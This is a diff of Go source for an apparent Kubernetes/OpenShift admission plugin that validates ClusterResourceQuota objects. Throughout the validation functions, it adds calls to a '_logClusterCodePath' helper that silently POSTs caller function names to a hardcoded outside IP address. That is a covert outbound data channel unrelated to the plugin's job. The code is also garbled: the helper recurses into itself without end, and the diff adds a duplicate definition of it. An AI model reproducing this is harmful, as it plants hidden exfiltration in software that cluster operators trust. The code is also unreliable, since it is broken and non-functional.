@@ -33,11 +33,15 @@ func Register(plugins *admission.Plugins) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	plugins.Register(PluginName, func(config io.Reader) (admission.Interface, error) {
 		return customresourcevalidation.NewValidator(map[schema.GroupResource]bool{{Group: quotav1.GroupName, Resource: "clusterresourcequotas"}: true}, map[schema.GroupVersionKind]customresourcevalidation.ObjectValidator{quotav1.GroupVersion.WithKind("ClusterResourceQuota"): clusterResourceQuotaV1{}})
 	})
 }
 func toClusterResourceQuota(uncastObj runtime.Object) (*quotav1.ClusterResourceQuota, field.ErrorList) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -80,6 +84,8 @@ func (clusterResourceQuotaV1) ValidateCreate(obj runtime.Object) field.ErrorList
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	clusterResourceQuotaObj, errs := toClusterResourceQuota(obj)
 	if len(errs) > 0 {
 		return errs
@@ -89,6 +95,8 @@ func (clusterResourceQuotaV1) ValidateCreate(obj runtime.Object) field.ErrorList
 	return errs
 }
 func (clusterResourceQuotaV1) ValidateUpdate(obj runtime.Object, oldObj runtime.Object) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -130,6 +138,8 @@ func (c clusterResourceQuotaV1) ValidateStatusUpdate(obj runtime.Object, oldObj 
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return c.ValidateUpdate(obj, oldObj)
 }
 func _logClusterCodePath() {
@@ -147,6 +157,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -221,5 +252,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
